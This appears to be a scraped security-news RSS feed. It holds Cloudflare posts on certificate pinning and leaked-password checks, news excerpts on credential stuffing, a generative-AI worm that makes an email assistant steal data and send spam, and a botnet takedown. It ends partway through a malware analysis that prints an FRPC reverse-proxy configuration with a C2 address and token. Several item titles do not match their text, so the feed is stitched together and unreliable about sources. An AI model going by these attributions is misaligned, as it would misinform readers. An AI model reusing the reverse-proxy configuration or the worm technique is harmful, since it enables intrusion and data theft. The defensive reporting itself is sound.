href="https://letsencrypt.org/2023/07/10/cross-sign-expiration.html"&gt;change their roots&lt;/a&gt; and when this happens, a correctly renewed certificate will break the pin, causing an outage. Since these pins are rarely updated, resolving such outages can be time-consuming as engineering teams try to identify and locate where the outdated pins have been set.&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;
          &lt;div&gt;
            &lt;h3&gt;Pinning certificates at the intermediate certificate&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#pinning-certificates-at-the-intermediate-certificate"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;Pinning an intermediate certificate instructs a client to only trust certificates issued by a specific intermediate CA, issued from a trusted root CA. With lifetimes ranging from 3 to 10 years, intermediate certificates offer a better balance between security and flexibility.&lt;/p&gt;&lt;p&gt;&lt;b&gt;Advantages:&lt;/b&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Better security:&lt;/b&gt; Narrows down the trust to certificates issued by a specific intermediate CA.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Simpler management:&lt;/b&gt; With intermediate CA lifetimes spanning a few years, certificate pins require less frequent updates, reducing the maintenance burden.&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;b&gt;Disadvantages:&lt;/b&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Broad trust:&lt;/b&gt; While pinning on an intermediate certificate is more restrictive than pinning on a root certificate, it still allows for a broad range of certificates to be trusted.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Maintenance:&lt;/b&gt; Intermediate certificates are rotated more frequently than root certificates, requiring more regular updates to pinned certificates.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Less predictability:&lt;/b&gt; With CAs like Let’s Encrypt issuing their certificates from varying intermediates, it’s no longer possible to predict which certificate chain will be used during a renewal, making it more likely for a certificate renewal to break a certificate pin and cause an outage.&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;
          &lt;div&gt;
            &lt;h3&gt;Pinning certificates at the leaf certificate&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#pinning-certificates-at-the-leaf-certificate"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;Pinning the leaf certificate instructs a client to only trust that specific certificate. Although this option offers the highest level of security, it also poses the greatest risk of causing an outage during a certificate renewal.&lt;/p&gt;&lt;p&gt;&lt;b&gt;Advantages:&lt;/b&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;High security:&lt;/b&gt; Provides the highest level of security by ensuring that only a specific certificate is trusted, minimizing the risk of a monster-in-the-middle attack.&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;b&gt;Disadvantages:&lt;/b&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Risky:&lt;/b&gt; Requires careful management of certificate renewals to prevent outages.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Management burden:&lt;/b&gt; Leaf certificates have shorter lifetimes, with 90 days becoming the standard, requiring constant updates to the certificate pin to avoid a breaking change during a renewal.&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;
          &lt;div&gt;
            &lt;h2&gt;Alternatives to certificate pinning&lt;/h2&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#alternatives-to-certificate-pinning"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
          &lt;p&gt;Given the risks and challenges associated with certificate pinning, we recommend the following as more effective and modern alternatives to achieve the same level of security (preventing a mis-issued certificate from intercepting traffic) that certificate pinning aims to provide.&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Shorter certificate lifetimes&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#shorter-certificate-lifetimes"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;Using shorter certificate lifetimes ensures that certificates are regularly renewed and replaced, reducing the risk of misuse of a compromised certificate by limiting the window of opportunity for attackers.&lt;/p&gt;&lt;p&gt;By default, Cloudflare issues 90-day certificates for customers. Customers using Advanced Certificate Manager can request TLS certificates with lifetimes as short as 14 days.&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;CAA records to restrict which CAs can issue certificates for a domain&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#caa-records-to-restrict-which-cas-can-issue-certificates-for-a-domain"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;&lt;a href="https://developers.cloudflare.com/ssl/edge-certificates/caa-records/"&gt;Certification Authority Authorization&lt;/a&gt; (CAA) DNS records allow domain owners to specify which CAs are allowed to issue certificates for their domain. This adds an extra layer of security by restricting issuance to trusted authorities, providing a similar benefit as pinning a root CA certificate. For example, if you’re using Google Trust Services as your CA, you can add the following CAA DNS record to ensure that only that CA issues certificates for your domain:&lt;/p&gt;
            &lt;pre&gt;&lt;code&gt;example.com         CAA 0 issue "pki.goog"&lt;/code&gt;&lt;/pre&gt;
            &lt;p&gt;By default, &lt;a href="https://developers.cloudflare.com/ssl/edge-certificates/caa-records/#caa-records-added-by-cloudflare"&gt;Cloudflare sets CAA records&lt;/a&gt; on behalf of customers to ensure that certificates can be issued from the CAs that Cloudflare partners with. Customers can choose to further restrict that list of CAs by adding their own CAA records.&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Certificate Transparency &amp;amp; monitoring&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#certificate-transparency-monitoring"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;Certificate Transparency (CT) provides the ability to monitor and audit certificate issuances. By logging certificates in publicly accessible CT logs, organizations are able to monitor, detect, and respond to misissued certificates at the time they are issued.&lt;/p&gt;&lt;p&gt;Cloudflare customers can set up &lt;a href="https://developers.cloudflare.com/ssl/edge-certificates/additional-options/certificate-transparency-monitoring/"&gt;CT Monitoring&lt;/a&gt; to receive notifications when certificates are issued in their domain. Today, we notify customers using the product about all certificates issued for their domains. In the future, we will allow customers to filter those notifications, so that they are only notified when an external party that isn’t Cloudflare issues a certificate for the owner’s domain. This product is available to all customers and can be enabled with the click of a button.&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Multi-vantage point Domain Control Validation (DCV) checks to prevent mis-issuances&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#multi-vantage-point-domain-control-validation-dcv-checks-to-prevent-mis-issuances"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;For a CA to issue a certificate, the domain owner needs to prove ownership of the domain by serving Domain Control Validation (DCV) records. While uncommon, one attack vector of DCV validation allows an actor to perform BGP hijacking to spoof the DNS response and trick a CA into mis-issuing a certificate. To prevent this form of attack, CAs have started to perform DCV validation checks from multiple locations to ensure that a certificate is only issued when a full quorum is met.&lt;/p&gt;&lt;p&gt;Cloudflare has developed &lt;a href="https://blog.cloudflare.com/secure-certificate-issuance"&gt;its own solution&lt;/a&gt; that CAs can use to perform multi vantage point DCV checks. In addition, Cloudflare partners with CAs like Let’s Encrypt who continue to develop these checks to support &lt;a href="https://community.letsencrypt.org/t/lets-encrypt-is-adding-two-new-remote-perspectives-for-domain-validation/214123/3"&gt;new locations&lt;/a&gt;, reducing the risk of a certificate mis-issuance.&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Specifying ACME account URI in CAA records&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#specifying-acme-account-uri-in-caa-records"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;A new enhancement to the &lt;a href="https://datatracker.ietf.org/doc/html/rfc8555"&gt;ACME protocol&lt;/a&gt; allows certificate requesting parties to specify an ACME account URI, the ID of the ACME account that will be requesting the certificates, in CAA records to tighten control over the certificate issuance process. This ensures that only certificates issued through an authorized ACME account are trusted, adding another layer of verification to certificate issuance. Let’s Encrypt &lt;a href="https://letsencrypt.org/docs/caa/"&gt;supports&lt;/a&gt; this extension to CAA records which allows users with a Let’s Encrypt certificate to set a CAA DNS record, such as the following:&lt;/p&gt;
            &lt;pre&gt;&lt;code&gt;example.com         CAA 0 issue "letsencrypt.org;accounturi=https://acme-v02.api.letsencrypt.org/acme/acct/&amp;lt;account_id&amp;gt;"&lt;/code&gt;&lt;/pre&gt;
            &lt;p&gt;With this record, Let’s Encrypt subscribers can ensure that only Let’s Encrypt can issue certificates for their domain and that these certificates were only issued through their ACME account.&lt;/p&gt;&lt;p&gt;Cloudflare will look to support this enhancement automatically for customers in the future.&lt;/p&gt;
          &lt;div&gt;
            &lt;h2&gt;Conclusion&lt;/h2&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#conclusion"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
          &lt;p&gt;Years ago, certificate pinning was a valuable tool for enhancing security, but over the last 20 years, it has failed to keep up with new advancements in the certificate ecosystem. As a result, instead of providing the intended security benefit, it has increased the number of outages caused during a successful certificate renewal. With new enhancements in certificate issuance standards and certificate transparency, we’re encouraging our customers and the industry to move towards adopting those new standards and deprecating old ones.&lt;/p&gt;&lt;p&gt;If you’re a Cloudflare customer and are required to pin your certificate, the only way to ensure a zero-downtime renewal is to upload your own custom certificates. We recommend using the &lt;a href="https://blog.cloudflare.com/staging-tls-certificate-every-deployment-safe-deployment"&gt;staging network&lt;/a&gt; to test your certificate renewal to ensure you have updated your certificate pin.&lt;/p&gt;</content:encoded><guid isPermaLink="false">60UVrfwDr6RkKdtneMF0ph</guid><category>Security</category><category>Network Services</category><category>Certificate Pinning</category><category>TLS</category><category>SSL</category><category>Certificate Transparency</category></item><item><title>Congratulations to the Top MSRC 2024 Q2 Security Researchers!</title><link>https://msrc.microsoft.com/blog/2024/07/congratulations-to-the-top-msrc-2024-q2-security-researchers/</link><description>Congratulations to all the researchers recognized in this quarter’s Microsoft Researcher Recognition Program leaderboard!

            &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/5E4xMAFZoPqfmTJ1o7lLLC/3d8d71e57002f0e653c0eb894e53a95e/image2-8.png" /&gt;
            
            &lt;/figure&gt;&lt;p&gt;Password reuse is a real problem. When people use the same password across multiple services, it creates a risk that a breach of one service will give attackers access to a different, apparently unrelated, service. Attackers know people reuse passwords and build giant lists of known passwords and known usernames or email addresses.&lt;/p&gt;&lt;p&gt;If you got to the end of that paragraph and realized you’ve reused the same password multiple places, stop reading and go change those passwords. We’ll wait.&lt;/p&gt;&lt;p&gt;To help protect Cloudflare customers who have used a password attackers know about, we are releasing a feature to improve the security of the Cloudflare dashboard for all our customers by automatically checking whether their Cloudflare user password has appeared in an attacker's list. Cloudflare will securely check a customer’s password against threat intelligence sources that monitor data breaches in other services.&lt;/p&gt;&lt;p&gt;If a customer logs in to Cloudflare with a password that was leaked in a breach elsewhere on the Internet, Cloudflare will alert them and ask them to choose a new password.&lt;/p&gt;&lt;p&gt;For some customers, the news that their password was known to hackers will come as a surprise – no one wants to intentionally use passwords that they know have been leaked elsewhere. To help customers avoid being locked out when they urgently need to use their Cloudflare dashboard, the leaked password check will provide a warning to the customer for the first three login attempts. After those three attempts, Cloudflare will require that the customer reset their password.&lt;/p&gt;&lt;p&gt;Resetting a leaked password is just the first step in Internet account security. The best way to protect your Cloudflare account, or any account, is to add two-factor authentication, such as using a hardware security key or an authenticator application, or to rely on a single sign-on integration. Cloudflare makes it easy for any user to &lt;a href="https://developers.cloudflare.com/fundamentals/setup/account/account-security/2fa/#enable-two-factor-authentication-for-your-cloudflare-account"&gt;add two-factor authentication security to their account&lt;/a&gt; through app-based codes, hardware keys, or passkeys. Cloudflare account Super Administrators can also require that all members enable two-factor authentication.&lt;/p&gt;&lt;p&gt;Whether or not a user has been impacted in a data breach, we encourage everyone to add two-factor authentication security to their Cloudflare account.&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;How do credentials leak?&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#how-do-credentials-leak"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;Each time you authenticate to a service on the Internet with a username and password, that service can take a range of steps to protect your credentials.&lt;/p&gt;&lt;p&gt;More secure providers will hash the passwords. &lt;a href="https://www.authgear.com/post/password-hashing-salting#hashing"&gt;Hashing&lt;/a&gt; uses a cryptographic algorithm to convert the password into a random string of characters. Some platforms will layer on additional safeguards like a &lt;a href="https://www.authgear.com/post/password-hashing-salting#salting"&gt;salt&lt;/a&gt; mechanism that introduces a random value to each password before the hashing process to ensure that two identical passwords do not have identical hashes.&lt;/p&gt;&lt;p&gt;These protections, combined with rate limits on login attempts, prevent brute force attacks. However, even for providers that adopt these best practices, users can still become victims of determined attackers when bad actors gain access to breached password databases. Attackers can collect compromised email password pairs to gain access to user accounts elsewhere as part of targeted attacks.&lt;/p&gt;&lt;p&gt;When vendors discover these kinds of compromised accounts, in many cases they will quickly force a password reset. However, resetting a leaked password in one application can still leave you vulnerable in other applications if you reused that password in other places and do not change your credentials everywhere.&lt;/p&gt;
            &lt;figure&gt;
            
            &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/410DAKcAIJaJmKI71DfN3L/71c68701609b8ead70dbdea2f37215fd/image3-13.png" /&gt;
            
            &lt;/figure&gt;&lt;p&gt;That kind of password reuse means that an attacker can steal your credentials from one Internet service and try them against dozens of other popular destinations to see where you reuse the same password.&lt;/p&gt;&lt;p&gt;These so-called &lt;a href="https://www.cloudflare.com/learning/bots/what-is-credential-stuffing/"&gt;credential stuffing attacks&lt;/a&gt; have become more prevalent as breaches pile up. Attackers can sit on large troves of credentials for months or years, waiting to sell them to another bad actor or to use them in targeted attacks. For customers who want to protect themselves from these and other attacks that can compromise their end customer’s accounts, Cloudflare has solutions like &lt;a href="https://blog.cloudflare.com/account-takeover-protection/"&gt;bot management, exposed credential checks, and rate limiting&lt;/a&gt; available to help defend against these kinds of attacks&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;How can customers protect against the impact of leaked credentials?&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#how-can-customers-protect-against-the-impact-of-leaked-credentials"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;If every password you use is unique, then a data breach in one vendor will be limited to just that particular system. For that reason, we encourage users to adopt a password manager that can create and remember unique passwords for each service that you use. Thankfully, the most popular operating systems now include password managers by default, and multiplatform third party options also make it easy for users to adopt this practice.&lt;/p&gt;&lt;p&gt;However, unique passwords are still vulnerable to phishing attacks. The best way to protect any Internet account is to add two-factor authentication (2FA). Two-factor authentication provides a comprehensive defense against credential stuffing attacks. When using two-factor authentication to log in, you must use your password and, for example, a one-time code from an app or a tap on a physical hardware key. The password alone is not enough to access your account.&lt;/p&gt;&lt;p&gt;Adoption of two-factor authentication, specifically hardware keys, has been &lt;a href="https://www.microsoft.com/en-us/security/blog/2019/08/20/one-simple-action-you-can-take-to-prevent-99-9-percent-of-account-attacks/"&gt;shown to be able to eliminate 99.9% of account takeovers&lt;/a&gt;, since the attacker must also get access to your second factor in addition to your password. In the case of hardware keys, they need to physically obtain the key.&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;How does Cloudflare check for leaked credentials?&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#how-does-cloudflare-check-for-leaked-credentials"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;When a user attempts to log into Cloudflare, we will check if the password used has been leaked in a known data breach of another service or application on the Internet. We maintain data on breaches of Internet services that we can use to search against. Because we use password hashes, scrambled versions of the original password that can’t be easily reversed, we compare a hash of the password to hashes of compromised passwords found in these lists from other attacks. An additional benefit, beside the security of hashes, is the ability to perform fast lookups, much faster than plaintext searches. This means that we can perform these checks without adding significant latency to the login process for users.&lt;/p&gt;&lt;p&gt;Because of the potential impact of a Cloudflare account being compromised, we opt for a more secure approach of disallowing leaked credentials regardless of whether they were associated with the specific user’s email or not. Unfortunately, data breaches are likely to continue to happen. Therefore, being proactive helps reduce the risk of new breaches that contain the email and password pair allowing for an account to be compromised before the data is available to us.&lt;/p&gt;&lt;p&gt;If we detect a match, the user will be prompted with the following warning. We will also send an email notification with instructions on what to do and a unique link in order to reset the password.&lt;/p&gt;
            &lt;figure&gt;
            
            &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/bCm8LmZVjuGn70hDdjVT2/7c554325a98559d54ae2f5683f75090a/Screenshot-2024-06-24-at-10.16.02-AM.png" /&gt;
            
            &lt;/figure&gt;&lt;p&gt;At this point, the user will still be able to log in to their Cloudflare account. We strongly encourage users to reset their password immediately. However, we know that in some cases you need to reach the Cloudflare dashboard immediately or do not have convenient access to the email used for the account. Cloudflare will allow two additional login attempts to succeed with the same compromised password before forcing the user to reset their password.&lt;/p&gt;&lt;p&gt;To reset a password in Cloudflare Dashboard, navigate to the &lt;a href="https://dash.cloudflare.com/profile/authentication"&gt;&lt;b&gt;Authentication&lt;/b&gt; page&lt;/a&gt; in &lt;b&gt;My Profile&lt;/b&gt;. From here, select &lt;b&gt;Change Password&lt;/b&gt; and enter both the current password to authenticate and a new, non-compromised password. Alternatively, for those whose password was leaked, upon login an email will be sent with a unique link to reset the password.&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;What’s next?&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#whats-next"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;Forcing users to reset compromised credentials helps prevent attacks from spreading on the Internet, but it’s just a small piece of improved account security. We know that adding the next step, second factor authentication, can be cumbersome. We have committed to &lt;a href="https://www.cisa.gov/securebydesign"&gt;CISA’s Secure by Design Pledge&lt;/a&gt;, which includes working to increase 2FA adoption across the industry. We will share our plans on how we will be implementing the pledge by mid-2025.&lt;/p&gt;&lt;p&gt;Adding multifactor authentication to every one of your accounts on the Internet can still be a chore, no matter how much the experience is improved. It’s much easier if you can just do it with one account and use that account to authenticate into other services and applications – a single-sign on (SSO) flow. Right now, our SSO feature is limited to enterprise accounts, and we plan to change that. We will allow users to access Cloudflare through other providers like Google, GitHub, and more. Allowing users to reduce how many unique password and 2FA combinations they have to keep track of helps to reduce the likelihood of being impacted by future password breaches.&lt;/p&gt;</content:encoded><guid isPermaLink="false">OEX1mcgZrCSgEplJZHr1h</guid><category>Passwords</category><category>Security</category></item><item><title>Mitigating SSRF Vulnerabilities Impacting Azure Machine Learning</title><link>https://msrc.microsoft.com/blog/2024/06/mitigating-ssrf-vulnerabilities-impacting-azure-machine-learning/</link><description>Summary On May 9, 2024, Microsoft successfully addressed multiple vulnerabilities within the Azure Machine Learning (AML) service, which were initially discovered by security research firms Wiz and Tenable.

&lt;p&gt;"You should not have to hand over all the details of your life to be warehoused and analyzed in someone's AI cloud," Apple Senior VP of Software Engineering Craig Federighi said.&lt;/p&gt;
&lt;h2&gt;Trust, but verify&lt;/h2&gt;
&lt;p&gt;Part of what Apple calls "a brand new standard for privacy and AI" is achieved through on-device processing. Federighi said "many" of Apple's generative AI models can run entirely on a device powered by an A17+ or M-series chips, eliminating the risk of sending your personal data to a remote server.&lt;/p&gt;&lt;p&gt;&lt;a href="https://arstechnica.com/ai/2024/06/apples-ai-promise-your-data-is-never-stored-or-made-accessible-by-apple/"&gt;Read full article&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href="http://en.wikipedia.org/wiki/Credential_stuffing"&gt;Credential stuffing&lt;/a&gt; is an attack in which usernames and passwords exposed in one leak are tried out against other accounts, typically using automated scripts. When people reuse usernames and passwords across services or make small, easily intuited changes between them, actors can gain access to accounts with even more identifying information and access.&lt;/p&gt;
&lt;p&gt;In the case of the Roku attacks, that meant access to stored payment methods, which could then be used to buy streaming subscriptions and Roku hardware. &lt;a href="https://www.roku.com/blog/protecting-your-roku-account"&gt;Roku wrote on its blog&lt;/a&gt;, and in &lt;a href="https://oag.ca.gov/system/files/Template%20Notification%203-8-2024.pdf"&gt;a mandated data breach report&lt;/a&gt;, that purchases occurred in "less than 400 cases" and that full credit card numbers and other "sensitive information" was not revealed.&lt;/p&gt;&lt;p&gt;&lt;a href="https://arstechnica.com/security/2024/04/roku-forcing-2-factor-authentication-after-breach-of-600k-accounts/"&gt;Read full article&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Despite the angst among policymakers, security experts, and competitors, Microsoft faced no consequences for its latest embarrassing failure. The United States government kept buying and using Microsoft products, and senior officials refused to publicly rebuke the tech giant. It was another reminder of how insulated Microsoft has become from virtually any government accountability, even as the Biden administration vows to make powerful tech firms take more responsibility for America’s cyber defense.&lt;/p&gt;

Startups and tech companies are building AI agents and ecosystems on top of the systems that can &lt;a href="https://www.wired.com/story/ai-chatbots-chatgpt-boring-chores/"&gt;complete boring chores for you&lt;/a&gt;: think automatically making calendar bookings and potentially &lt;a href="https://www.wired.com/story/fast-forward-tested-next-gen-ai-assistant/"&gt;buying products&lt;/a&gt;. But as the tools are given more freedom, it also increases the potential ways they can be attacked.&lt;/p&gt;
&lt;p&gt;Now, in a demonstration of the risks of connected, autonomous AI ecosystems, a group of researchers has created one of what they claim are the first generative AI worms—which can spread from one system to another, potentially stealing data or deploying malware in the process. “It basically means that now you have the ability to conduct or to perform a new kind of cyberattack that hasn't been seen before,” says Ben Nassi, a Cornell Tech researcher behind the research.&lt;/p&gt;
&lt;p&gt;Nassi, along with fellow researchers Stav Cohen and Ron Bitton, created the worm, dubbed Morris II, as a nod to the original &lt;a href="https://www.wired.com/2011/07/0726first-computer-fraud-indictment/"&gt;Morris computer worm&lt;/a&gt; that caused chaos across the Internet in 1988. In a &lt;a href="https://sites.google.com/view/compromptmized"&gt;research paper and website &lt;/a&gt;shared exclusively with WIRED, the researchers show how the AI worm can attack a generative AI email assistant to steal data from emails and send spam messages—breaking some security protections in ChatGPT and Gemini in the process.&lt;/p&gt;&lt;p&gt;&lt;a href="https://arstechnica.com/ai/2024/03/researchers-create-ai-worms-that-can-spread-from-one-system-to-another/"&gt;Read full article&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Avast's apps would "block annoying tracking cookies that collect data on your browsing activities," and prevent web services from "tracking your online activity." Deep in its privacy policy, Avast said information that it collected would be "anonymous and aggregate." In its fiercest rhetoric, Avast's desktop software claimed it would stop "hackers making money off your searches."&lt;/p&gt;
&lt;p&gt;All of that language was offered up while Avast was collecting users' browser information from 2014 to 2020, then selling it to more than 100 other companies through &lt;a href="https://arstechnica.com/tech-policy/2020/01/avast-kills-off-jumpshot-the-subsidiary-that-sold-all-your-web-data/"&gt;a since-shuttered entity known as Jumpshot&lt;/a&gt;, according to the Federal Trade Commission.

&lt;p&gt;That malware, which worked as a botnet for the Russian hacking group &lt;a href="https://arstechnica.com/features/2023/05/is-cybersecurity-an-unsolvable-problem/"&gt;Fancy Bear&lt;/a&gt;, was removed in January 2024 under a secret court order as part of "Operation Dying Ember," according to the FBI's director. It affected routers running Ubiquiti's EdgeOS, but only those that had not changed their default administrative password. Access to the routers allowed the hacking group to "conceal and otherwise enable a variety of crimes," the DOJ claims, including spearphishing and credential harvesting in the US and abroad.&lt;/p&gt;
&lt;p&gt;Unlike previous attacks by Fancy Bear—that the DOJ ties to GRU Military Unit 26165, which is also known as APT 28, Sofacy Group, and Sednit, among other monikers—the Ubiquiti intrusion relied on a known malware, &lt;a href="https://arstechnica.com/information-technology/2020/03/lilin-dvrs-and-zyxel-nas-devices-have-been-active-exploit-for-months/"&gt;Moobot&lt;/a&gt;. Once infected by "Non-GRU cybercriminals," GRU agents installed "bespoke scripts and files" to connect and repurpose the devices, according to the DOJ.&lt;/p&gt;&lt;p&gt;&lt;a href="https://arstechnica.com/information-technology/2024/02/doj-turns-tables-on-russian-hackers-uses-their-malware-to-wipe-out-botnet/"&gt;Read full article&lt;/a&gt;&lt;/p&gt;

His fork, &lt;a href="http://freenginx.org/"&gt;freenginx&lt;/a&gt;, is "going to be run by developers, and not corporate entities," &lt;a href="https://mailman.nginx.org/pipermail/nginx-devel/2024-February/K5IC6VYO2PB7N4HRP2FUQIBIBCGP4WAU.html"&gt;writes Maxim Dounin&lt;/a&gt;, and will be "free from arbitrary corporate actions."&lt;/p&gt;
&lt;p&gt;Dounin is one of the earliest and &lt;a href="http://hg.nginx.org/nginx/"&gt;still most active coders&lt;/a&gt; on the open source Nginx project and one of the first employees of Nginx, Inc., a company created in 2011 to commercially support the steadily growing web server. Nginx is now used on roughly &lt;a href="https://w3techs.com/technologies/overview/web_server"&gt;one-third of the world's &lt;/a&gt;web servers, ahead of Apache.&lt;/p&gt;
&lt;h2&gt;A tricky history of creation and ownership&lt;/h2&gt;
&lt;p&gt;Nginx Inc. was acquired by Seattle-based networking firm F5 in 2019. Later that year, two of Nginx's leaders, Maxim Konovalov and Igor Sysoev, were &lt;a href="https://arstechnica.com/information-technology/2019/12/russian-media-group-rambler-attempting-to-hold-nginx-hostage/"&gt;detained and interrogated in their homes by armed Russian state agents&lt;/a&gt;. Sysoev's former employer, Internet firm &lt;a href="https://en.wikipedia.org/wiki/Rambler_(portal)"&gt;Rambler&lt;/a&gt;, claimed that it owned the rights to Nginx's source code, as it was developed during Sysoev's tenure at Rambler (where Dounin also worked). While the criminal charges and rights do not appear to have materialized, the implications of a Russian company's intrusion into a popular open source piece of the web's infrastructure caused some alarm.&lt;/p&gt;&lt;p&gt;&lt;a href="https://arstechnica.com/information-technology/2024/02/nginx-key-developer-starts-a-freenginx-fork-after-dispute-with-parent-firm/"&gt;Read full article&lt;/a&gt;&lt;/p&gt;

&lt;h5&gt;Description&lt;/h5&gt;
&lt;p&gt;This artifact is a cross platform full featured FRP that is written in GO language (Golang) and packed using Ultimate Packer for Executables (UPX). This utility can be used to locate servers behind a network firewall or obscured through NAT. It includes the KCP (no acronym) network protocol that allows for error-checked and anonymous delivery of data streams using the User Datagram Protocol (UDP) with packet level encryption support.&amp;nbsp;&lt;br /&gt;&lt;br /&gt;The program contains two different multiplexer libraries that can bi-directionally stream data over a NAT’d network. It also contains a command line interface (CLI) library that can leverage command shells such as PowerShell, Windows Management Instrumentation (WMI), and Z Shell (zsh). In addition, the utility features a unique capability that detects if the utility is executed from the command line or by double-clicking.&amp;nbsp;&lt;br /&gt;&lt;br /&gt;By default it is configured to connect to an Internet Protocol (IP) address on Transmission Control Protocol (TCP) port 1080. It must receive a specially formed packet from the C2 for the utility to deploy on the system.&lt;/p&gt;

&lt;p&gt;This artifact is a 64-bit Windows executable file that is packed using UPX. This packed file contains a compiled version of an open-source tool published on GitHub called "FRPC". The "FRPC" is a command-line tool written in Golang that is designed to open a reverse proxy between the compromised system and the TA's C2 server.&amp;nbsp;&lt;br /&gt;&lt;br /&gt;When the "FRPC" is installed and executed on the compromised system, it attempts to establish a connection with the Fast Reverse Proxy Server (FRPS) using the reverse proxy method to allow the TA to control the compromised system. This "FRPC" application supports encryption, compression, and allows easy token authentication. It also supports the protocols below:&amp;nbsp;&lt;br /&gt;&lt;br /&gt;--Begin protocols--&amp;nbsp;&lt;br /&gt;Transmission Control Protocol (TCP)&amp;nbsp;&lt;br /&gt;User Datagram Protocol (UDP)&amp;nbsp;&lt;br /&gt;An alternative Hypertext Transfer Protocol (HTTP)&amp;nbsp;&lt;br /&gt;An alternative Hypertext Transfer Protocol Secure (HTTPS)&amp;nbsp;&lt;br /&gt;--End protocols--&amp;nbsp;&lt;br /&gt;&lt;br /&gt;Displayed below is the "FRPC" tool configuration that contains the network communication method, the remote "FRPS" server's public Internet Protocol (IP) address and port numbers:&amp;nbsp;&lt;br /&gt;&lt;br /&gt;--Begin configuration--&amp;nbsp;&lt;br /&gt;[common]&amp;nbsp;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;server_addr = 192.168.18.111&amp;nbsp;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;server_port = 8081&amp;nbsp;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;server_addrs = [Default IP addresses]&amp;nbsp;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;server_ports = 8443,8443,8443&amp;nbsp;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;token = 1kyRdFmuk0i25JbCJmtift1c9VA05VBS&amp;nbsp;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;protocol = tcp&amp;nbsp;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;tls_enable = true&amp;nbsp;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;disable_custom_tls_first_byte = true&amp;nbsp;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;log_level = debug&amp;nbsp;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;[plugin_socks5]&amp;nbsp;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;type = tcp&amp;nbsp;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;remote_port = 1080&amp;nbsp;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;plugin = socks5&amp;nbsp;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;use_encryption = true&amp;nbsp;&lt;br 